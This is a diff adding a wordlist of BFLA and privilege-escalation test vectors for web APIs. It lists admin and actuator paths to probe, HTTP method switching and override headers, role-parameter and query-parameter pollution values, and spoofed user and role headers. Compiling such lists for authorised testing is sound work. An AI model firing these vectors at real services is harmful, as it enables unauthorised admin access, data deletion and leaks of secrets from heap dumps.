@@ -1,0 +1,59 @@
+# BFLA / privilege-escalation test vectors
+# Use against endpoints accessible to low-privilege users to test admin functions
+
+# Common admin paths to probe as a regular user
+/api/admin
+/api/admin/users
+/api/admin/config
+/api/admin/settings
+/api/admin/logs
+/api/admin/stats
+/api/v1/admin
+/api/internal
+/api/internal/users
+/api/debug
+/api/management
+/api/console
+/actuator
+/actuator/env
+/actuator/heapdump
+
+# HTTP method switching (same path, different verb)
+GET    /api/users
+POST   /api/users
+PUT    /api/users/{id}
+PATCH  /api/users/{id}
+DELETE /api/users/{id}
+OPTIONS /api/users
+
+# HTTP method override headers
+X-HTTP-Method-Override: PUT
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+
+# Role/privilege parameter pollution
+role=admin
+role=superuser
+role=root
+isAdmin=true
+is_admin=1
+admin=true
+privilege=admin
+user_type=admin
+access_level=9999
+tier=enterprise
+
+# Query param pollution (last-wins / first-wins)
+?role=user&role=admin
+?id=self&id=1
+?user_id=me&user_id=1
+
+# Header-based privilege spoofing
+X-User-Role: admin
+X-User-Id: 1
+X-Forwarded-User: admin
+X-Original-User: admin
+X-Remote-User: admin
+X-Auth-User: admin
+X-Tenant-Id: 0
